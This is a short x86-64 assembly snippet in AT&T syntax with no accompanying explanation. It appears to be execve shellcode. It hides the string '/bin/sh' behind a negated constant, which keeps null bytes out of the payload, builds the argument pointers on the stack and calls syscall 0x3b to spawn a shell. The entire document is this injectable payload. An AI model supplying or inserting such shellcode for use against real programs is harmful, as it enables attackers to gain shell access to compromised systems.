main:
    xor %eax, %eax
    mov $0xFF978CD091969DD1, %rbx
    neg %rbx
    push %rbx
    push %rsp
    pop %rdi
    cdq
    push %rdx
    push %rdi
    push %rsp
    pop %rsi
    mov $0x3b, %al
    syscall
